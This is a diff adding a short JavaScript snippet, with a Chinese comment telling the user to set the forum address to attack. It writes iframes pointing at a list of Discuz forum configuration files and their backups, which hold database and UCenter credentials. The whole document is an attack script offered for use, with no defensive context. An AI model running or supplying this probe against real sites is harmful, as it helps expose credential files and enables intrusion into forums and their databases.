@@ -1,0 +1,13 @@
+﻿<script>
+var url = "http://discuz.net";//此处修改你要攻击的论坛地址
+var array = new Array();
+array[0] = "config/config_global.php.bak";
+array[1] = "config/config_global.php";
+array[2] = "config/config_ucenter.php.bak";
+array[3] = "config/config_ucenter.php";
+array[4] = "uc_server/data/config.inc.php.bak";
+array[5] = "uc_server/data/config.inc.php";
+for(var i=0;i<=array.length-1;i++){
+	document.write("<iframe src="+url+array[i]+"></iframe>");
+}
+</script>
